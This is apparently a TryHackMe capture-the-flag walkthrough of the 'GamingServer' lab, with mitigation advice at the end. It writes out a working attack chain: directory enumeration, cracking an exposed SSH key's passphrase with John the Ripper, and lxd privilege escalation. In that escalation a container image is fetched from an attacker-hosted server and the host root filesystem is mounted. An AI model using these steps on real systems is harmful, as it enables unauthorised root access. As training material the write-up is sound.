# 🟩 GamingServer – Try Hack Me (THM) Walkthrough Report  

**Prepared by:** Nishanth Antony  
**Date:** August 29, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps  
**Objective:** Identify open ports and hidden directories on the target.  
**Commands Used:**  
- `rustscan $IP`  
- `gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`  

**Findings:**  
- Open ports: SSH (22) and HTTP (80).  
- Gobuster revealed a hidden `/secret` directory containing an SSH key.  

---

## 2. Exploitation Process  
**Step 1 – SSH Key Retrieval and Cracking**  
- Downloaded `SecretKey` from `/secret`.  
- Converted to hash format:  
  `python ssh2john.py SecretKey > id_rsa.hash`  
- Cracked passphrase with John the Ripper:  
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Note: This format may emit false positives, so it will keep trying even after
  finding a possible candidate.
  Press 'q' or Ctrl-C to abort, almost any other key for status
  letmein          (id_rsa)
  1g 0:00:00:12 DONE (2020-08-30 22:24) 0.08278g/s 1187Kp/s 1187Kc/s 1187KC/s *7¡Vamos!
  Session completed
  ```
- Identified username `john` from `https://$IP/index.html` source code.  

**Step 2 – SSH Access as John**  
- Connected via SSH:  
  `ssh john@$IP -i ./SecretKey`  
- Entered passphrase `letmein` to log in.  
- Retrieved user flag:  
  ```bash
  cat user.txt
  a****************e
  ```
- Outcome: User flag retrieved.  

**Step 3 – Privilege Escalation via LXD**  
- Noticed membership in `lxd` group via `id` command.  
- Built Alpine image locally:  
  ```bash
  git clone https://github.com/saghul/lxd-alpine-builder.git
  cd lxd-alpine-builder
  ./build-alpine
  ```
- Started web server:  
  `python -m SimpleHTTPServer`  
- Downloaded image to target:  
  `cd /tmp`  
  `wget http://$LHOST:8000/alpine-v3.12-x86_64-20200830_2354.tar.gz`  
- Imported and initialized container:  
  ```bash
  lxc image import ./alpine-v3.12-x86_64-20200830_2354.tar.gz --alias myimage
  lxc init myimage ignite -c security.privileged=true
  lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
  lxc start ignite
  lxc exec ignite /bin/sh
  whoami
  ```
- Retrieved root flag:  
  ```bash
  cat mnt/root/root/flag.txt
  2************c
  ```
- Outcome: Root flag retrieved.  

---

## 3. Proof of Concept (PoC)  
- **SSH Key Cracking:**  
  `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash` yielded `letmein`.  
- **LXD Privilege Escalation:**  
  Imported Alpine image and mounted root filesystem to gain root shell.  

---

## 4. Privilege Escalation  
- Exploited LXD container privileges to mount the root filesystem and access the root flag.  

---

## 5. Mitigation Recommendations  
- **Web Server Hardening:**  
  - Restrict access to sensitive directories (e.g., `/secret`).  
- **SSH Security:**  
  - Avoid exposing private keys; enforce strong passphrases and restrict key usage.  
- **Privilege Management:**  
  - Limit `lxd` group membership to authorized users only.  
  - Disable unprivileged container creation if not needed.  
- **Patch Management:**  
  - Update OpenSSH and web server software to latest versions.  
  - Monitor for unauthorized container activity.  

---

## 6. Lessons Learned  
- **Exposed Credentials:** Hidden SSH keys are vulnerable if accessible via web directories.  
- **LXD Exploitation:** Membership in `lxd` group can lead to privilege escalation.  
- **Enumeration Importance:** Thorough directory scanning reveals critical assets.  

---

## 7. Skills Practiced  
- Network scanning (rustscan)  
- Web directory enumeration (gobuster)  
- SSH key cracking (ssh2john, john)  
- LXD privilege escalation  
- Secure reporting and mitigation strategies  
